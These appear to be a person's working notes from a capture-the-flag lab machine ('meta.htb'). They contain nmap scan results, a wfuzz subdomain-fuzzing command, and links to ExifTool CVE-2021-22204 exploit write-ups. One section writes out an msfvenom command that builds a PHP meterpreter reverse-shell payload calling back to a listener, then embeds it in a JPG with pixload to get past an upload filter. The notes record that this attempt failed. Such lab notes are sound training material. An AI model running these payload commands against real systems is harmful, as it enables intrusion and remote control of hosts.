IP:: 10.10.11.114   meta.htb artcorp.htb

PORT STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Aggressive OS guesses: Linux 5.4 (95%), Linux 5.0 (94%), Linux 5.0 - 5.4 (94%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.3 (92%), Linux 2.6.32 - 3.13 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.1 (91%), Linux 3.7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   207.88 ms 10.10.16.1
2   365.75 ms meta.htb (10.129.142.77)

wfuzz - /assets, /css 
    + wfuzz --hc 400,302 -H "HOST: FUZZ.artcorp.htb" -  http://artcorp.htb | grep 200
        /dev01 :: http://dev01.artcorp.htb/metaview
gobuster - 
ffuf -
nikto - nothing


php not allowed @upload::
    + jpg/png
`$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php`
`$ pixload-jpg -payload "$(cat payload.php)" test.jpg`
:: No luck

LAB:: TODO::
https://github.com/convisolabs/CVE-2021-22204-exiftool/tree/master/lab



References::
https://github.com/chinarulezzz/pixload
https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
https://github.com/convisolabs/CVE-2021-22204-exiftool